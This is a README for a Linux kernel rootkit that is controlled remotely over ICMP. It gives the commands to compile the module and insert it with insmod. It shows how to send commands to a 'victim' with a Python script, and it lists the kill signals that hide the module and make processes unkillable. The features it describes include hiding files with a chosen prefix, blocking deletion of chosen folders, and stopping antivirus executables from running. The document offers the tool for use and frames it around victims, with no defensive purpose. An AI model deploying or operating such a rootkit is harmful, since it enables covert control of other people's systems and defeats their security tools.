# ICMP Rootkit

A rootkit is a type of malicious software designed to provide unauthorized access or
control over a computer system, while remaining hidden from detection. Rootkits typically
operate in core of computer’s operating system, giving them significant control while
avoiding detection. ICMP allows us to create a connection with infected computer and directly via cli send malicious data or commands to it. 

## Compilation and insertion of module

1. Compile using make

```shell
cd Rootkit && make
```

2. Insert module into linux kernel
   
```shell
sudo insmod rk.ko
```

3. To check for module presence

```shell
sudo lsmod | head
```

4. To delete module from linux kernel

```shell
sudo rmmod rk
```

## Usage of icmp

After injecting module into victims system, you can send commands via python script ```send.py``` like this:

```shell
sudo python3 send.py <ip> <command>
```

Example:

```shell
sudo python3 send.py 175.120.101.34 "kill -64 1"
```

## Module functionality

1. To hide a rootkit module
   
```shell
sudo kill -64 <pid>
```

2. To show a rootkit module

```shell
sudo kill -63 <pid>
```

3. To hide some process (and make it unkillable)

```shell
sudo kill -62 <pid to hide>
```

3. To return hidden process back

```shell
sudo kill -61 <pid of hidden>
```

4. Files and folders with prefix "arman" are not showed during ```ls```
5. Victim can't ```cat``` , ```echo```, ```touch```, ```find``` files with prefix "arman"
6. Folders with prefix ```virus``` neither can be deleted with ```rm -rf``` nor with ```rmdir```
7. Victim can't launch executable with prefix "antivirus"
